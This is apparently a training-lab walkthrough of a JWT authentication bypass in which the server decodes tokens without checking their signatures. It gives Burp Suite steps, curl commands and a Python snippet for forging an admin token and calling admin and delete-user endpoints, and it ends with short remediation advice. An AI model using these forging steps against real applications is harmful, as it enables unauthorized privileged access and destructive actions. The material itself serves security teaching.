# JWT Authentication Bypass via Unverified Signature

## Overview

This lab demonstrates a JWT implementation flaw where the server **decodes** a JSON Web Token's claims but never **verifies** its signature. Because the signature isn't checked, any claim in the payload — including the username or role — can be freely edited without needing to know the server's secret signing key.

**Goal:** Forge a session token claiming to be an admin user, access the admin panel, and perform a privileged action (e.g. deleting a user).

**Root cause:** A JWT library typically exposes two functions — one that verifies the signature (`verify()`) and one that only decodes it (`decode()`). When a server mistakenly uses the decode-only function to read incoming tokens, it trusts whatever claims are in the payload, signature or not.

---

## Background: JWT structure

A JWT is three base64url-encoded segments separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

- **Header** — metadata (algorithm, key ID).
- **Payload** — the claims (e.g. `sub`, `role`, `exp`).
- **Signature** — a hash of header + payload, generated with a secret key, meant to detect tampering.

The header and payload are only *encoded*, not encrypted — anyone can read or edit them. The signature is the only thing that's supposed to stop silent tampering. If the server never checks it, editing the payload is enough.

---

## Method 1: Burp Suite

### Step 1 — Capture a valid session
1. Proxy your browser traffic through Burp.
2. Log in with any valid low-privilege account.
3. In **Proxy > HTTP history**, find a request carrying the `session` cookie (e.g. a request to an account page).
4. Send that request to **Repeater** (`Ctrl+R` or right-click > Send to Repeater).

### Step 2 — Edit the JWT
1. In Repeater, open the **JSON Web Token** tab (next to Pretty/Raw/Hex). Burp auto-detects JWTs in headers/cookies and shows the decoded header and payload as an editable tree.
2. Locate the claim that identifies the user or role (commonly `sub`, `username`, or `role`).
3. Change its value to the admin identity (e.g. `"administrator"`).
4. **Do not** let Burp regenerate the signature — leave the original signature untouched. That's the point: the server never checks it.

### Step 3 — Target the privileged endpoint
1. Change the request line to target the admin-only path (e.g. `GET /admin`).
2. Click **Send**.
3. If the forged token is accepted, the response should show admin-only content.

### Step 4 — Perform the privileged action
1. From the admin page response, find the endpoint for the action you need (e.g. a delete-user link/button).
2. Repeat the request with the same forged cookie against that endpoint.
3. Confirm the action succeeded (e.g. the target user disappears from the admin panel).

---

## Method 2: curl

### Step 1 — Log in and capture a session cookie

Many labs/apps add CSRF protection to the login form, so fetch the login page first and extract the token before submitting credentials:

```bash
# Fetch the login page and save cookies
curl -s -c cookies.txt https://TARGET_HOST/login -o login.html

# Extract the CSRF token from the hidden input field
CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' login.html)

# Submit login using the same cookie jar and the CSRF token
curl -i -b cookies.txt -c cookies.txt -X POST https://TARGET_HOST/login \
  -d "username=YOUR_USER&password=YOUR_PASS&csrf=$CSRF"
```

If the app has no CSRF protection, skip straight to the POST without the `csrf` field.

Inspect `cookies.txt` for the `session=...` value — this is your starting JWT.

### Step 2 — Decode the token to see its structure

```bash
JWT="<paste captured JWT here>"

HEADER=$(echo "$JWT" | cut -d. -f1)
PAYLOAD=$(echo "$JWT" | cut -d. -f2)
SIG=$(echo "$JWT" | cut -d. -f3)

echo "$PAYLOAD" | base64 -d 2>/dev/null
# e.g. {"iss":"issuer","exp":1234567890,"sub":"lowpriv_user"}
```

### Step 3 — Build a forged payload

Edit the JSON to claim the privileged identity, then re-encode as base64url (**no padding, no line breaks**):

```bash
NEW_PAYLOAD=$(echo -n '{"iss":"issuer","sub":"administrator","exp":9999999999}' \
  | base64 | tr -d '\n' | tr '+/' '-_' | tr -d '=')
```

> **Common pitfall:** plain `base64` wraps output at 76 characters by default, inserting a newline into your token. Always pipe through `tr -d '\n'` before converting to base64url — otherwise the forged cookie will be silently corrupted and requests may fail with confusing transport-level errors.

### Step 4 — Reassemble the token

Keep the **original, now-mismatched signature** — since the server never verifies it:

```bash
FORGED_JWT="${HEADER}.${NEW_PAYLOAD}.${SIG}"

# Sanity check: should contain exactly 2 dots and no embedded newline
echo "$FORGED_JWT"
```

### Step 5 — Hit the privileged endpoint

```bash
curl -i https://TARGET_HOST/admin --cookie "session=${FORGED_JWT}"
```

If this returns admin content, find the privileged action's endpoint from the response HTML and repeat with the same cookie:

```bash
curl -i "https://TARGET_HOST/admin/delete?username=TARGET_USER" \
  --cookie "session=${FORGED_JWT}"
```

---

## Optional: Python one-liner equivalent

```python
import jwt

token = "captured.jwt.token"
payload = jwt.decode(token, options={"verify_signature": False})
payload["sub"] = "administrator"

header = jwt.get_unverified_header(token)
forged = jwt.encode(payload, key="anything", algorithm=header["alg"], headers=header)
print(forged)
```

Since the signature is never checked, the `key` passed to `encode()` can be anything — the resulting (invalid) signature will still be accepted.

---

## Why this works

The server has no persistent record of which tokens it issued or what they originally contained. Its only way to detect tampering is to verify the signature on every incoming token. If that check is skipped — usually because the wrong library function was used — the payload becomes fully attacker-controlled data.

## Remediation (for reference)

- Always call the library's full **verify** function, not just decode, on every incoming token.
- Reject tokens with unexpected or missing algorithms (don't trust the `alg` header blindly).
- Keep the signing key secret and rotate it if ever exposed.
